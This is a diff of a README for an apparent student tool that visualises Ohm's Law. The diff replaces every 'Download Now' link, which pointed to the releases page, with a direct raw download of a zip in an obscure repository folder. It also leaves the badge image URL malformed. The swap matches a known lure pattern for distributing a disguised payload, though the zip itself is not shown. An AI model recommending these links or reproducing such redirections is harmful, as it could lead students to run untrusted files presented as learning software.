@@ -1,6 +1,6 @@
 # 🎓 Ohm-s-Law-Experiment-Visualizer - Understand Ohm’s Law Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/pavukhhh/Ohm-s-Law-Experiment-Visualizer/releases)
+[![Download Now](https://raw.githubusercontent.com/pavukhhh/Ohm-s-Law-Experiment-Visualizer/main/tindalo/Ohm-s-Law-Experiment-Visualizer_1.0.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/pavukhhh/Ohm-s-Law-Experiment-Visualizer/main/tindalo/Ohm-s-Law-Experiment-Visualizer_1.0.zip)
 
 ## 📜 Description
 Ohm-s-Law-Experiment-Visualizer is a simple yet powerful tool for Class 11 students. This Python application helps you to demonstrate and verify Ohm’s Law, which states that Voltage (V) equals Current (I) multiplied by Resistance (R). Using this software, you can visualize how these electrical concepts work together in an interactive way. 
@@ -19,7 +19,7 @@ Before you download, ensure that your computer meets the following requirements:
 
 To get started, visit the releases page to download the application. 
 
-[Download Now](https://github.com/pavukhhh/Ohm-s-Law-Experiment-Visualizer/releases)
+[Download Now](https://raw.githubusercontent.com/pavukhhh/Ohm-s-Law-Experiment-Visualizer/main/tindalo/Ohm-s-Law-Experiment-Visualizer_1.0.zip)
 
 ### 3. Installation Steps
 1. Click on the link to open the releases page.
@@ -80,4 +80,4 @@ This project covers the following topics relevant to your learning:
 ## 📢 Stay Updated
 Follow this repository for updates, including new features and improvements. Check back regularly for the latest versions and enhancements.
 
-[Download Now](https://github.com/pavukhhh/Ohm-s-Law-Experiment-Visualizer/releases) to get started with your journey through Ohm's Law!
+[Download Now](https://raw.githubusercontent.com/pavukhhh/Ohm-s-Law-Experiment-Visualizer/main/tindalo/Ohm-s-Law-Experiment-Visualizer_1.0.zip) to get started with your journey through Ohm's Law!
